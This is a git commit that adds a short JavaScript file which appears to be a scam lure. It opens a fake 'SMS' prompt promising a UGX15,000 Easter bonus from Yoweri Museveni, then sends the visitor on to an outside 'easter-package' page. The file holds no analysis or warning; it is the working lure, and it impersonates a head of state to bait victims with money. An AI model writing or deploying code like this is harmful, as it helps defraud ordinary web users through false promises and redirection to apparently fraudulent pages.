88751cd933303a7437b08bb9bb816994b124cf6f
mfednewblog8 <nsikakimoh68@gmail.com>
2026-03-30 07:09:30 +0100

    Create easter-bonus-ug.js

---
+++ easter-bonus-ug.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW UGX15,000'
+password=prompt('SMS: Congratulations, you are eligible to receive UGX15,000 Easter Bonus From YOWERI MUSEVENI, click OK to get yours now','WITHDRAW UGX15,000');
+if (password != 'WITHDRAW UGX15,000') {
+location.href='https://ibaidad.com/easter-package.html';
+}
